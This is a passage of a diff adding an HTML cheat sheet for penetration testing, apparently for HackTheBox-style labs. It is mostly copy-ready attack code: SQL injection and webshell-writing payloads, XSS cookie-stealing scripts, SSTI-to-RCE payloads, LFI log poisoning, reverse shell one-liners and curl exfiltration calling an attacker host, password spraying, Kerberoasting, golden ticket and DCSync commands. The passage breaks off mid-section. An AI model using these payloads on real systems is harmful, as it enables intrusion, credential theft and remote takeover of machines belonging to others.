+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># List shares</span>
+<span class="c-cmd">smbclient</span> <span class="c-flag">-L</span> //<span class="c-var">$IP</span> <span class="c-flag">-N</span>
+<span class="c-cmd">smbmap</span> <span class="c-flag">-H</span> <span class="c-var">$IP</span> <span class="c-flag">-u</span> anonymous
+
+<span class="c-comment"># Connect to share</span>
+<span class="c-cmd">smbclient</span> //<span class="c-var">$IP</span>/ShareName <span class="c-flag">-U</span> <span class="c-var">user%pass</span>
+
+<span class="c-comment"># enum4linux-ng</span>
+<span class="c-cmd">enum4linux-ng</span> <span class="c-flag">-A</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># crackmapexec</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--shares</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--users</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--spider</span> ShareName</pre>
+      </div>
+    </div>
+
+    <!-- NFS -->
+    <div class="card searchable">
+      <div class="card-title">📂 NFS / FTP Enumeration <span class="card-tag tag-info">2049/21</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># NFS show exports</span>
+<span class="c-cmd">showmount</span> <span class="c-flag">-e</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># Mount NFS</span>
+<span class="c-cmd">sudo mount</span> <span class="c-flag">-t nfs</span> <span class="c-var">$IP</span>:/export/path /mnt/nfs
+
+<span class="c-comment"># NFS UID trick (match remote UID)</span>
+<span class="c-cmd">sudo useradd</span> <span class="c-flag">-u</span> <span class="c-var">1001</span> nfsuser
+<span class="c-cmd">sudo</span> <span class="c-flag">-u</span> nfsuser ls /mnt/nfs
+
+<span class="c-comment"># FTP</span>
+<span class="c-cmd">ftp</span> <span class="c-var">$IP</span>   <span class="c-comment"># try anonymous:anonymous</span>
+<span class="c-cmd">wget</span> <span class="c-flag">-r</span> ftp://anonymous:anonymous@<span class="c-var">$IP</span></pre>
+      </div>
+    </div>
+
+    <!-- SNMP -->
+    <div class="card searchable">
+      <div class="card-title">📡 SNMP Enumeration <span class="card-tag tag-medium">UDP 161</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># snmpwalk</span>
+<span class="c-cmd">snmpwalk</span> <span class="c-flag">-c</span> public <span class="c-flag">-v1</span> <span class="c-var">$IP</span>
+<span class="c-cmd">snmpwalk</span> <span class="c-flag">-c</span> public <span class="c-flag">-v2c</span> <span class="c-var">$IP</span> <span class="c-flag">-On</span>
+
+<span class="c-comment"># onesixtyone brute community</span>
+<span class="c-cmd">onesixtyone</span> <span class="c-flag">-c</span> /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <span class="c-var">$IP</span>
+
+<span class="c-comment"># snmp-check</span>
+<span class="c-cmd">snmp-check</span> <span class="c-var">$IP</span> <span class="c-flag">-c</span> public</pre>
+      </div>
+    </div>
+
+    <!-- LDAP -->
+    <div class="card searchable">
+      <div class="card-title">🗂️ LDAP Enumeration <span class="card-tag tag-info">389/636</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Anonymous LDAP query</span>
+<span class="c-cmd">ldapsearch</span> <span class="c-flag">-x</span> <span class="c-flag">-H</span> ldap://<span class="c-var">$IP</span> <span class="c-flag">-b</span> <span class="c-string">"DC=domain,DC=htb"</span>
+
+<span class="c-comment"># With credentials</span>
+<span class="c-cmd">ldapsearch</span> <span class="c-flag">-x</span> <span class="c-flag">-H</span> ldap://<span class="c-var">$IP</span> <span class="c-flag">-D</span> <span class="c-string">"user@domain.htb"</span> <span class="c-flag">-w</span> <span class="c-var">password</span> <span class="c-flag">-b</span> <span class="c-string">"DC=domain,DC=htb"</span>
+
+<span class="c-comment"># ldapdomaindump</span>
+<span class="c-cmd">ldapdomaindump</span> <span class="c-flag">-u</span> <span class="c-string">'domain\user'</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-var">$IP</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 3: WEB — SQL INJECTION
+══════════════════════════════════════════════ -->
+<section id="web-sqli" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-red">⬡</div>
+    <div class="section-title">SQL Injection</div>
+    <div class="section-meta">WEB ATTACK</div>
+  </div>
+
+  <div class="alert alert-warning">
+    <span class="alert-icon">⚠</span>
+    <div class="alert-body">
+      <div class="alert-title">Detection First</div>
+      Always test with single quote <code>'</code>, double quote <code>"</code>, and <code>1=1--</code> before using automated tools.
+    </div>
+  </div>
+
+  <div class="grid grid-2">
+    <!-- Manual SQLi -->
+    <div class="card searchable">
+      <div class="card-title">💉 Manual SQL Injection <span class="card-tag tag-critical">CRITICAL</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">SQL</span><span class="code-desc">Detection & Extraction</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Basic detection</span>
+<span class="c-string">'</span>  --&gt; error?
+<span class="c-string">''</span> --&gt; no error = SQLi likely
+<span class="c-string">1' OR '1'='1</span>
+<span class="c-string">1' OR 1=1--</span>
+<span class="c-string">1' OR 1=1#</span>
+
+<span class="c-comment">-- UNION-based (find columns)</span>
+<span class="c-string">' ORDER BY 1--</span>
+<span class="c-string">' ORDER BY 5--</span>  <span class="c-comment">-- increase until error</span>
+<span class="c-string">' UNION SELECT NULL,NULL,NULL--</span>
+
+<span class="c-comment">-- UNION extract data</span>
+<span class="c-string">' UNION SELECT 1,database(),user(),version()--</span>
+<span class="c-string">' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--</span>
+<span class="c-string">' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--</span>
+<span class="c-string">' UNION SELECT 1,username,password FROM users--</span>
+
+<span class="c-comment">-- Error-based (EXTRACTVALUE)</span>
+<span class="c-string">' AND EXTRACTVALUE(1,CONCAT('~',database()))--</span>
+<span class="c-string">' AND UPDATEXML(1,CONCAT('~',(SELECT password FROM users LIMIT 1)),1)--</span>
+
+<span class="c-comment">-- Blind time-based</span>
+<span class="c-string">' AND SLEEP(5)--</span>
+<span class="c-string">' AND IF(1=1,SLEEP(5),0)--</span></pre>
+      </div>
+    </div>
+
+    <!-- sqlmap -->
+    <div class="card searchable">
+      <div class="card-title">🤖 sqlmap Automation</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Basic scan</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-u</span> <span class="c-string">"http://$IP/page?id=1"</span> <span class="c-flag">--dbs</span>
+
+<span class="c-comment"># POST request</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-u</span> <span class="c-string">"http://$IP/login"</span> <span class="c-flag">--data</span> <span class="c-string">"user=admin&pass=test"</span> <span class="c-flag">-p</span> user
+
+<span class="c-comment"># From request file (Burp export)</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-r</span> request.txt <span class="c-flag">--batch</span> <span class="c-flag">--dbs</span>
+
+<span class="c-comment"># Dump specific table</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-r</span> req.txt <span class="c-flag">-D</span> mydb <span class="c-flag">-T</span> users <span class="c-flag">--dump</span>
+
+<span class="c-comment"># File read (needs FILE priv)</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-r</span> req.txt <span class="c-flag">--file-read</span> /etc/passwd
+
+<span class="c-comment"># WAF bypass</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-r</span> req.txt <span class="c-flag">--tamper</span> space2comment,between <span class="c-flag">--random-agent</span>
+
+<span class="c-comment"># OS shell (MySQL)</span>
+<span class="c-cmd">sqlmap</span> <span class="c-flag">-r</span> req.txt <span class="c-flag">--os-shell</span></pre>
+      </div>
+    </div>
+
+    <!-- Second-order SQLi -->
+    <div class="card searchable">
+      <div class="card-title">🔄 Second-Order SQLi <span class="card-tag tag-high">STORED</span></div>
+      <p>Payload stored in DB, executed later when retrieved. Classic in profile/registration forms.</p>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Register with malicious username</span>
+<span class="c-string">admin'--</span>
+<span class="c-string">user' UNION SELECT 1,2,3,4,5--</span>
+
+<span class="c-comment">-- Payload triggers when username used in query:</span>
+<span class="c-comment">-- SELECT * FROM posts WHERE author='[USERNAME]'</span>
+<span class="c-comment">-- Becomes: author='user' UNION SELECT 1,2,3,4,5--'</span></pre>
+      </div>
+    </div>
+
+    <!-- MySQL File Write -->
+    <div class="card searchable">
+      <div class="card-title">📝 MySQL File Write (LOAD_FILE / INTO OUTFILE)</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Read file (requires FILE privilege)</span>
+<span class="c-string">' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--</span>
+
+<span class="c-comment">-- Write webshell</span>
+<span class="c-string">' UNION SELECT 1,'&lt;?php system($_GET["cmd"]); ?&gt;',3 INTO OUTFILE '/var/www/html/shell.php'--</span>
+
+<span class="c-comment">-- Check secure_file_priv</span>
+<span class="c-string">' UNION SELECT 1,@@secure_file_priv,3--</span>
+
+<span class="c-comment">-- Check writable dirs (look at error for path)</span>
+<span class="c-string">' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/test'--</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 4: XSS
+══════════════════════════════════════════════ -->
+<section id="web-xss" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-orange">⬡</div>
+    <div class="section-title">Cross-Site Scripting (XSS)</div>
+    <div class="section-meta">WEB ATTACK</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🎯 XSS Payloads <span class="card-tag tag-high">COOKIE STEAL</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">JS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">// Basic detection</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="c-comment">// Cookie steal — listener: nc -lvnp 8888</span>
+&lt;script&gt;document.location='http://<span class="c-var">$IP</span>:8888/?c='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror=fetch('http://<span class="c-var">$IP</span>:8888/?c='+document.cookie)&gt;
+&lt;script&gt;new Image().src='http://<span class="c-var">$IP</span>:8888/?c='+document.cookie&lt;/script&gt;
+
+<span class="c-comment">// Steal and send full page</span>
+&lt;script&gt;
+fetch(document.location).then(r=>r.text()).then(t=>
+  fetch('http://<span class="c-var">$IP</span>:8888/?data='+btoa(t))
+)&lt;/script&gt;
+
+<span class="c-comment">// Filter bypass</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;img src=x OnErRoR=alert(1)&gt;
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+javascript:alert(1)
+</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔗 XSS → Session Hijack Chain</div>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">Find reflected/stored XSS</div>
+            <div class="step-desc">Input fields, URL params, headers reflected in response</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">Start listener</div>
+            <div class="step-desc"><code>python3 -m http.server 8888</code> on your VPN IP</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">Inject cookie-steal payload</div>
+            <div class="step-desc">Via stored XSS, ensure it's in admin-visible area</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">Wait for bot/admin visit</div>
+            <div class="step-desc">Cookie arrives at your listener</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">5</div>
+          <div class="step-body">
+            <div class="step-title">Use stolen cookie</div>
+            <div class="step-desc">Set in browser DevTools → Application → Cookies</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 5: SSTI
+══════════════════════════════════════════════ -->
+<section id="web-ssti" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-purple">⬡</div>
+    <div class="section-title">Server-Side Template Injection (SSTI)</div>
+    <div class="section-meta">WEB ATTACK</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🧪 SSTI Detection & Identification</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Detection probes (if output = 49, it's vulnerable)</span>
+{{7*7}}           → 49 = Jinja2, Twig
+${7*7}            → 49 = Freemarker, Velocity
+#{7*7}            → 49 = Smarty
+{{7*'7'}}         → 7777777 = Jinja2
+                  → 49 = Twig
+
+<span class="c-comment">-- Engine fingerprint</span>
+Jinja2:  {{config}}
+Twig:    {{_self.env.registerUndefinedFilterCallback("system")}}
+Smarty:  {php}echo `id`;{/php}
+Mako:    ${open('/etc/passwd').read()}</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">💥 SSTI → RCE Payloads <span class="card-tag tag-critical">CRITICAL</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">SSTI</span><span class="code-desc">By Engine</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Jinja2 (Flask/Python)</span>
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{%print(request.application.__globals__.__builtins__.__import__('os').popen('id').read())%}
+
+<span class="c-comment">-- Twig (PHP) — v1.x</span>
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+
+<span class="c-comment">-- Twig (PHP) — v2+ / admin context</span>
+{{["id"]|map("system")}}
+{{["id", 0]|sort("system")}}
+
+<span class="c-comment">-- Freemarker (Java)</span>
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+
+<span class="c-comment">-- Mako (Python)</span>
+${os.popen('id').read()}
+
+<span class="c-comment">-- Smarty (PHP)</span>
+{system('id')}
+{php}echo shell_exec('id');{/php}</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 6: LFI
+══════════════════════════════════════════════ -->
+<section id="web-lfi" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-orange">⬡</div>
+    <div class="section-title">LFI / Path Traversal</div>
+    <div class="section-meta">WEB ATTACK</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">📁 LFI Payloads <span class="card-tag tag-high">FILE READ</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Basic LFI</span>
+?file=../../etc/passwd
+?file=/etc/passwd
+?file=....//....//etc/passwd
+?file=..%2f..%2fetc%2fpasswd
+
+<span class="c-comment">-- Null byte bypass (PHP &lt; 5.3)</span>
+?file=../../etc/passwd%00
+
+<span class="c-comment">-- PHP wrappers</span>
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=php://input   <span class="c-comment">(POST: &lt;?php system('id'); ?&gt;)</span>
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+<span class="c-comment">-- Log poisoning (SSH, Apache)</span>
+<span class="c-comment">-- 1. Poison log with PHP code in User-Agent:</span>
+curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://$IP/
+<span class="c-comment">-- 2. Include the log:</span>
+?file=/var/log/apache2/access.log&cmd=id
+
+<span class="c-comment">-- Useful files Linux</span>
+/etc/passwd  /etc/shadow  /etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+~/.ssh/id_rsa
+~/.bash_history</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🪟 Windows Path Traversal</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Windows traversal</span>
+?file=..\..\windows\system32\drivers\etc\hosts
+?file=..\..\..\windows\win.ini
+?file=%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+
+<span class="c-comment">-- Useful Windows files</span>
+C:\Windows\win.ini
+C:\inetpub\wwwroot\web.config
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\Users\Administrator\Desktop\root.txt</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 7: RCE
+══════════════════════════════════════════════ -->
+<section id="web-rce" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-red">⬡</div>
+    <div class="section-title">Remote Code Execution / Command Injection</div>
+    <div class="section-meta">WEB ATTACK</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">💥 Command Injection <span class="card-tag tag-critical">CRITICAL</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- Separators</span>
+cmd; id
+cmd && id
+cmd || id
+cmd | id
+cmd `id`
+cmd $(id)
+cmd %0a id     <span class="c-comment">(URL encoded newline)</span>
+
+<span class="c-comment">-- Blind detection</span>
+127.0.0.1; sleep 5
+127.0.0.1 && ping -c 4 $LHOST
+
+<span class="c-comment">-- Exfil via DNS</span>
+$(curl http://$LHOST:8888/$(id|base64))
+
+<span class="c-comment">-- Windows cmd injection</span>
+127.0.0.1 & whoami
+127.0.0.1 | dir
+127.0.0.1 %26 whoami</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔄 Reverse Shell One-liners</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">nc -lvnp 4444</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Bash</span>
+bash -i &gt;&amp; /dev/tcp/<span class="c-var">$LHOST</span>/4444 0&gt;&amp;1
+bash -c 'bash -i &gt;& /dev/tcp/<span class="c-var">$LHOST</span>/4444 0>&1'
+
+<span class="c-comment"># Python</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="c-var">$LHOST</span>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
+
+<span class="c-comment"># PHP</span>
+php -r '$s=fsockopen("<span class="c-var">$LHOST</span>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+<span class="c-comment"># Netcat</span>
+nc -e /bin/bash <span class="c-var">$LHOST</span> 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span class="c-var">$LHOST</span> 4444 &gt;/tmp/f
+
+<span class="c-comment"># PowerShell</span>
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<span class="c-var">$LHOST</span>",4444);$stream=$client.GetStream();...
+
+<span class="c-comment"># URL-encoded bash (use in web)</span>
+bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<span class="c-var">$LHOST</span>%2F4444%200%3E%261%27</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 8: ACTIVE DIRECTORY
+══════════════════════════════════════════════ -->
+<section id="ad-enum" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-purple">▤</div>
+    <div class="section-title">Active Directory Enumeration</div>
+    <div class="section-meta">AD PHASE</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🩸 BloodHound Collection <span class="card-tag tag-critical">MUST DO</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># bloodhound-python</span>
+<span class="c-cmd">bloodhound-python</span> <span class="c-flag">-u</span> user <span class="c-flag">-p</span> pass <span class="c-flag">-d</span> domain.htb <span class="c-flag">-ns</span> <span class="c-var">$IP</span> <span class="c-flag">-c</span> all
+
+<span class="c-comment"># SharpHound (on Windows target)</span>
+.\SharpHound.exe <span class="c-flag">-c</span> All <span class="c-flag">--outputdirectory</span> C:\Temp
+
+<span class="c-comment"># Key BloodHound queries:</span>
+<span class="c-comment"># → Find all Domain Admins</span>
+<span class="c-comment"># → Find Shortest Path to Domain Admins</span>
+<span class="c-comment"># → Find Principals with DCSync Rights</span>
+<span class="c-comment"># → Kerberoastable Accounts</span>
+<span class="c-comment"># → ASREPRoastable Accounts</span></pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">👥 User/Group Enumeration</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Get all users</span>
+<span class="c-cmd">GetADUsers.py</span> <span class="c-flag">-all</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># crackmapexec users</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--users</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--groups</span>
+
+<span class="c-comment"># PowerShell (from Windows)</span>
+Get-ADUser -Filter * -Properties *
+Get-ADGroup -Filter * | Select Name
+Get-ADGroupMember "Domain Admins"</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔑 Password Attacks</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Password spray (avoid lockout!)</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> users.txt <span class="c-flag">-p</span> <span class="c-string">'Winter2024!'</span> <span class="c-flag">--continue-on-success</span>
+<span class="c-cmd">kerbrute</span> passwordspray <span class="c-flag">-d</span> domain.htb users.txt <span class="c-string">'Password123!'</span>
+
+<span class="c-comment"># Username format guessing</span>
+<span class="c-comment"># john.smith, jsmith, johnsmith, j.smith</span>
+<span class="c-cmd">kerbrute</span> userenum <span class="c-flag">-d</span> domain.htb usernames.txt
+
+<span class="c-comment"># RID brute (get usernames anonymous)</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-string">''</span> <span class="c-flag">-p</span> <span class="c-string">''</span> <span class="c-flag">--rid-brute</span></pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">📋 ACL / Permission Analysis</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Find all objects user has rights on</span>
+Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match "<span class="c-var">USER_SID</span>"}
+
+<span class="c-comment"># Find users with GenericAll on group</span>
+Get-ObjectAcl -Identity "<span class="c-var">Domain Admins</span>" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
+
+<span class="c-comment"># PowerView</span>
+Find-InterestingDomainAcl -ResolveGUIDs
+Get-DomainObjectAcl -Identity "<span class="c-var">target</span>" -ResolveGUIDs</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 9: KERBEROS ATTACKS
+══════════════════════════════════════════════ -->
+<section id="ad-kerberos" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-red">▤</div>
+    <div class="section-title">Kerberos Attacks</div>
+    <div class="section-meta">AD ATTACK</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🎟️ Kerberoasting <span class="card-tag tag-critical">CRITICAL</span></div>
+      <p>Request TGS for service accounts with SPN → crack offline</p>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># GetUserSPNs.py</span>
+<span class="c-cmd">GetUserSPNs.py</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-request</span> <span class="c-flag">-outputfile</span> spns.txt
+
+<span class="c-comment"># crackmapexec</span>
+<span class="c-cmd">crackmapexec</span> ldap <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--kerberoasting</span> hashes.txt
+
+<span class="c-comment"># Crack with hashcat</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> spns.txt /usr/share/wordlists/rockyou.txt</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🎭 ASREPRoasting <span class="card-tag tag-high">HIGH</span></div>
+      <p>Users with "Do not require Kerberos preauthentication" → get AS-REP hash</p>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># GetNPUsers.py</span>
+<span class="c-cmd">GetNPUsers.py</span> domain.htb/ <span class="c-flag">-usersfile</span> users.txt <span class="c-flag">-format</span> hashcat <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
+<span class="c-cmd">GetNPUsers.py</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-request</span> <span class="c-flag">-format</span> hashcat <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># Crack</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 18200</span> asrep.txt /usr/share/wordlists/rockyou.txt</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🎫 Pass-the-Ticket / Silver Ticket</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Export tickets (Windows - Mimikatz)</span>
+sekurlsa::tickets /export
+
+<span class="c-comment"># Use ticket (Linux)</span>
+<span class="c-cmd">export</span> KRB5CCNAME=/path/to/ticket.ccache
+<span class="c-cmd">smbclient</span> <span class="c-flag">-k</span> //<span class="c-var">$IP</span>/share <span class="c-flag">-N</span>
+<span class="c-cmd">psexec.py</span> <span class="c-flag">-k</span> <span class="c-flag">-no-pass</span> domain.htb/<span class="c-var">user</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># Golden Ticket (needs krbtgt hash)</span>
+<span class="c-cmd">ticketer.py</span> <span class="c-flag">-nthash</span> <span class="c-var">KRBTGT_HASH</span> <span class="c-flag">-domain-sid</span> <span class="c-var">DOMAIN_SID</span> <span class="c-flag">-domain</span> domain.htb administrator</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔄 DCSync Attack</div>
+      <p>Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</p>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># secretsdump</span>
+<span class="c-cmd">secretsdump.py</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span>@<span class="c-var">$IP</span>
+<span class="c-cmd">secretsdump.py</span> <span class="c-flag">-just-dc-user</span> administrator domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># crackmapexec</span>
